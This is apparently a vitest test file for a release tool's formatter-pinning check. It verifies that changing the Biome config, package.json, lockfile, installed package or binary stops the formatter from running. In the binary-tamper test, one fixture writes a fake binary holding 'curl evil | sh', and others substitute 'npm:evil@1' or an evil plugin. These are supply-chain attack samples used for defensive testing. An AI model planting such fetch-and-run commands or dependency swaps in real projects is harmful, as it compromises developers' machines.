import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import {
  detectReleaseFormatter,
  formatReleaseFiles,
  formatterConfigHash,
} from '../src/git/release-format.ts';

/**
 * R18-S [rv3-2]: the release formatter runs only while its configuration AND its program (package.json, lockfile, the
 * installed package and its binary) are unchanged since they were approved locally (REVIEW blocker 5).
 */
function repo(): { wt: string; repoPath: string; pkgDir: string } {
  const wt = mkdtempSync(join(tmpdir(), 'aom-fmt-'));
  writeFileSync(join(wt, 'biome.json'), '{"formatter":{"indentWidth":2}}');
  writeFileSync(join(wt, 'CHANGELOG.md'), '# x\n');
  writeFileSync(join(wt, 'package.json'), '{"devDependencies":{"@biomejs/biome":"2.0.0"}}');
  writeFileSync(join(wt, 'pnpm-lock.yaml'), "lockfileVersion: '9.0'\n");
  const pkgDir = join(wt, 'node_modules', '@biomejs', 'biome');
  mkdirSync(join(pkgDir, 'bin'), { recursive: true });
  writeFileSync(join(pkgDir, 'package.json'), '{"name":"@biomejs/biome","version":"2.0.0"}');
  writeFileSync(join(pkgDir, 'bin', 'biome'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
  mkdirSync(join(wt, 'node_modules', '.bin'), { recursive: true });
  symlinkSync(join(pkgDir, 'bin', 'biome'), join(wt, 'node_modules', '.bin', 'biome'));
  return { wt, repoPath: wt, pkgDir };
}

function setup() {
  const r = repo();
  const spec = detectReleaseFormatter(r.wt);
  if (!spec) throw new Error('no spec');
  const pinned = formatterConfigHash(r.wt, spec, {
    repoPath: r.repoPath,
    bin: join(r.wt, 'node_modules', '.bin', 'biome'),
  });
  const exec = vi.fn(async () => ({ exitCode: 0, stdout: '', stderr: '', timedOut: false }));
  const run = () =>
    formatReleaseFiles({
      worktree: r.wt,
      files: ['CHANGELOG.md'],
      repoPath: r.repoPath,
      pathDirs: [],
      exec,
      platform: 'linux',
      formatterPinned: (h) => h === pinned,
    });
  return { r, exec, run };
}

describe('formatter pins', () => {
  it('the approved config and program run', async () => {
    const t = setup();
    expect(await t.run()).toMatchObject({ state: 'passed' });
    expect(t.exec).toHaveBeenCalled();
  });

  it('a changed formatter config skips the formatter and says how to approve it', async () => {
    const t = setup();
    writeFileSync(join(t.r.wt, 'biome.json'), '{"formatter":{"indentWidth":4},"plugins":["./evil.grit"]}');
    const out = await t.run();
    expect(out).toMatchObject({ state: 'skipped' });
    expect(out.state === 'skipped' && out.reason).toMatch(
      /not approved on this workstation[\s\S]*guildwise-runner formatter pin [0-9a-f]{64}/,
    );
    expect(t.exec).not.toHaveBeenCalled();
  });

  it('a changed formatter program is unpinned: package.json, lockfile, installed package or binary', async () => {
    const changes: Array<(r: ReturnType<typeof repo>) => void> = [
      (r) => writeFileSync(join(r.wt, 'package.json'), '{"devDependencies":{"@biomejs/biome":"npm:evil@1"}}'),
      (r) => writeFileSync(join(r.wt, 'pnpm-lock.yaml'), "lockfileVersion: '9.0'\n# evil tarball\n"),
      (r) => writeFileSync(join(r.pkgDir, 'package.json'), '{"name":"@biomejs/biome","version":"6.6.6"}'),
      (r) => writeFileSync(join(r.pkgDir, 'bin', 'biome'), '#!/bin/sh\ncurl evil | sh\n', { mode: 0o755 }),
    ];
    for (const change of changes) {
      const t = setup();
      change(t.r);
      expect(await t.run()).toMatchObject({ state: 'skipped' });
      expect(t.exec).not.toHaveBeenCalled();
    }
  });
});
